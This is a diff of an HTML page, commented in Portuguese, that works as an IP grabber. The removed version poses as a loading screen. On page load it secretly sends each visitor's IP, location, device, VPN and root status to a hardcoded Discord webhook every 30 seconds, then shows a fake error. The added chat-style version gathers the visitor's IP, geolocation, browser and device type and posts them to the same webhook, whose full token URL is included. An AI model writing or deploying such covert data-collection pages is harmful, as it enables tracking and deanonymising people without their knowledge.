@@ -3,200 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carregando...</title>
+    <title>Captura de Dados</title>
     <style>
         body {
-            background-color: black;
+            background-color: #121212;
             color: white;
-            font-family: 'Courier New', Courier, monospace;
-            text-align: center;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
 
-        .loading {
-            font-size: 2em;
+        .chat-container {
+            width: 500px;
+            height: 700px;
+            background-color: #181818;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .chat-message {
+            background-color: #333;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            max-width: 80%;
+        }
+
+        .message-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            height: 100%;
+            overflow-y: auto;
+        }
+
+        .input-box {
+            background-color: #333;
+            border: none;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            width: 100%;
             margin-top: 20px;
+        }
+
+        #loading {
+            font-size: 20px;
+            text-align: center;
             color: #ff6347;
         }
 
-        .content {
-            border: 2px solid white;
-            padding: 20px;
-            background-color: rgba(0, 0, 0, 0.7);
-            width: 300px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+        .status-bar {
+            background-color: #333;
+            padding: 10px;
+            margin-top: 20px;
+            color: #ff6347;
             border-radius: 10px;
+            text-align: center;
         }
 
         .error {
             color: red;
-            font-size: 2em;
-            margin-top: 20px;
-        }
-
-        .status {
-            color: #ff6347;
+            font-size: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="content">
-        <h1>Carregando...</h1>
-        <p class="loading" id="loadingMessage">Por favor, aguarde...</p>
-        <p id="statusMessage" class="status">Estamos processando...</p>
+    <div class="chat-container">
+        <div class="message-container" id="messages"></div>
+        <input type="text" id="input" class="input-box" placeholder="Digite algo...">
+        <div id="loading" class="status-bar">Aguardando...</div>
     </div>
 
     <script>
-        // Função para pegar informações do dispositivo
-        function getDeviceInfo() {
-            const deviceInfo = navigator.userAgent;  // Informações do dispositivo
-            const browser = getBrowser();  // Função para capturar o navegador corretamente
-            const isMobile = /Mobi|Android/i.test(deviceInfo);
-            const isPC = !isMobile;
+        const ipApiUrl = 'https://ip-api.com/json/';
+        const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3'; // Substitua pelo seu webhook real
 
-            return { deviceInfo, browser, isMobile, isPC };
+        function createMessage(text, sender = 'bot') {
+            const messageContainer = document.getElementById('messages');
+            const messageElement = document.createElement('div');
+            messageElement.classList.add('chat-message');
+            messageElement.textContent = text;
+            messageContainer.appendChild(messageElement);
+            messageContainer.scrollTop = messageContainer.scrollHeight; // Scroll para o final
         }
 
-        // Função para detectar o navegador corretamente
-        function getBrowser() {
-            let userAgent = navigator.userAgent.toLowerCase();
-            if (userAgent.indexOf("chrome") > -1) {
-                return "Chrome";
-            } else if (userAgent.indexOf("firefox") > -1) {
-                return "Firefox";
-            } else if (userAgent.indexOf("safari") > -1) {
-                return "Safari";
-            } else {
-                return "Desconhecido";
-            }
-        }
-
-        // Função para verificar se o dispositivo está rootado (mobile)
-        function isRooted() {
-            if (/android/i.test(navigator.userAgent)) {
-                try {
-                    // Tentativa de verificar arquivos típicos de root em Android
-                    const fs = new ActiveXObject("Scripting.FileSystemObject");
-                    return fs.FileExists("/system/app/Superuser.apk") || fs.FileExists("/system/xbin/su");
-                } catch (e) {
-                    return false;
-                }
-            }
-            return false;
-        }
-
-        // Função para verificar se o usuário está usando VPN ou Proxy
-        function detectVPNorProxy(ip) {
-            return fetch(`https://ip-api.com/json/${ip}`)
+        // Função para pegar o IP e outras informações do usuário
+        function getUserInfo() {
+            fetch(ipApiUrl)
                 .then(response => response.json())
                 .then(data => {
-                    return data.proxy ? "Proxy Detectado" : "Sem Proxy/VPN Detectado";
+                    const ip = data.query;
+                    const city = data.city;
+                    const country = data.country;
+                    const region = data.regionName;
+
+                    const userAgent = navigator.userAgent;
+                    const browser = getBrowser(userAgent);
+                    const isMobile = /Mobi|Android/i.test(userAgent);
+                    const device = isMobile ? 'Mobile' : 'PC';
+
+                    const ipDetails = `IP: ${ip}\nCidade: ${city}\nPaís: ${country}\nRegião: ${region}`;
+                    const browserDetails = `Navegador: ${browser}\nDispositivo: ${device}`;
+                    
+                    createMessage(ipDetails);
+                    createMessage(browserDetails);
+
+                    sendDataToWebhook(ip, browser, device);
+                })
+                .catch(error => {
+                    createMessage("Erro ao obter o IP.", 'error');
                 });
         }
 
-        // Função para enviar as informações para o Discord Webhook
-        function sendToDiscord(info) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';
-            
+        // Função para detectar o navegador
+        function getBrowser(userAgent) {
+            if (userAgent.indexOf("Chrome") > -1) return 'Chrome';
+            if (userAgent.indexOf("Firefox") > -1) return 'Firefox';
+            if (userAgent.indexOf("Safari") > -1) return 'Safari';
+            if (userAgent.indexOf("Edge") > -1) return 'Edge';
+            return 'Desconhecido';
+        }
+
+        // Função para enviar os dados para o Discord Webhook
+        function sendDataToWebhook(ip, browser, device) {
+            const data = {
+                content: `
+**Informações Coletadas:**
+
+> **IP:** ${ip}
+> **Navegador:** ${browser}
+> **Dispositivo:** ${device}
+            `
+            };
+
             fetch(webhookUrl, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `
-**# Informações do Usuário:**
-
-> **IP:** ${info.ip}
-> **Dispositivo:** ${info.deviceInfo}
-> **Navegador:** ${info.browser}
-> **Modelo de Dispositivo:** ${info.model}
-> **VPN/Proxy:** ${info.vpnOrProxy}
-> **Root:** ${info.isRooted ? "Sim" : "Não"}
-> **Tipo de Dispositivo:** ${info.isMobile ? "Mobile" : "PC"}
-`)
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('Dados enviados com sucesso!');
+                    console.log("Dados enviados com sucesso!");
                 } else {
-                    console.error('Erro ao enviar dados');
+                    console.error("Erro ao enviar dados.");
                 }
             })
-            .catch(error => console.error('Erro ao enviar dados:', error));
+            .catch(error => {
+                console.error("Erro ao enviar dados:", error);
+            });
         }
 
-        // Função para pegar o IP e a região do usuário
-        function getUserIP() {
-            return fetch('https://ip-api.com/json')
+        // Função para capturar IP de uma API externa (pode ser IP Grabber)
+        function captureIP() {
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    return {
-                        ip: data.query,  // IP do usuário
-                        region: data.city + ', ' + data.country  // Região (cidade, país)
-                    };
+                    createMessage(`Capturado IP: ${data.ip}`);
+                    sendDataToWebhook(data.ip, "Desconhecido", "Desconhecido");
+                })
+                .catch(error => {
+                    createMessage("Erro ao capturar IP.", 'error');
                 });
         }
 
-        // Função para pegar o modelo do dispositivo
-        function getDeviceModel() {
-            if (/Mobi|Android/i.test(navigator.userAgent)) {
-                const model = navigator.userAgent.match(/(.*?)/);
-                return model ? model[1] : "Desconhecido";
+        // Quando o usuário enviar uma mensagem
+        document.getElementById('input').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                const input = document.getElementById('input');
+                const userMessage = input.value;
+                createMessage(userMessage, 'user');
+                input.value = ''; // Limpar o campo de entrada
+
+                // Verificar se o comando é 'start'
+                if (userMessage.toLowerCase() === 'start') {
+                    createMessage("Iniciando coleta de dados...", 'bot');
+                    getUserInfo();
+                }
+                // Se o comando for 'getip', capturar o IP
+                if (userMessage.toLowerCase() === 'getip') {
+                    createMessage("Obtendo IP externo...", 'bot');
+                    captureIP();
+                }
             }
-            return "Desktop";
-        }
+        });
 
-        // Função para simular a espera de 12 minutos (720 segundos)
-        function startLoading() {
-            let elapsedTime = 0;
-            const loadingMessage = document.getElementById('loadingMessage');
-            const statusMessage = document.getElementById('statusMessage');
-
-            const loadingInterval = setInterval(() => {
-                elapsedTime += 10;  // Atualizar a cada 10 segundos
-
-                // Enviar dados a cada 30 segundos
-                if (elapsedTime % 30 === 0) {
-                    getUserIP().then(userInfo => {
-                        const deviceInfo = getDeviceInfo();
-                        detectVPNorProxy(userInfo.ip).then(vpnStatus => {
-                            sendToDiscord({
-                                ...userInfo,
-                                deviceInfo: deviceInfo.deviceInfo,
-                                browser: deviceInfo.browser,
-                                model: getDeviceModel(),
-                                vpnOrProxy: vpnStatus,
-                                isRooted: isRooted(),
-                                isMobile: deviceInfo.isMobile
-                            });
-                        });
-                    });
-                }
-
-                // Atualizar mensagem de carregamento
-                loadingMessage.innerText = `Por favor, aguarde... (${elapsedTime / 60} min)`;
-
-                // Após 12 minutos (720 segundos), gerar erro e parar o carregamento
-                if (elapsedTime >= 720) {
-                    clearInterval(loadingInterval);  // Parar o carregamento
-                    showError();  // Mostrar erro
-                }
-            }, 10000);  // Intervalo de 10 segundos
-        }
-
-        // Função para mostrar mensagem de erro após 12 minutos
-        function showError() {
-            const statusMessage = document.getElementById('statusMessage');
-            const loadingMessage = document.getElementById('loadingMessage');
-            loadingMessage.innerText = "Ocorreu um erro durante o processamento.";
-            statusMessage.innerText = "Falha ao carregar os dados!";
-            document.body.style.backgroundColor = "red";  // Mudar fundo para vermelho
-        }
-
-        // Iniciar a tela de carregamento quando a página for carregada
-        window.onload = startLoading;
+        // Exemplo de inicialização
+        createMessage("Olá, sou o bot! Digite 'start' para começar.");
     </script>
 </body>
 </html>
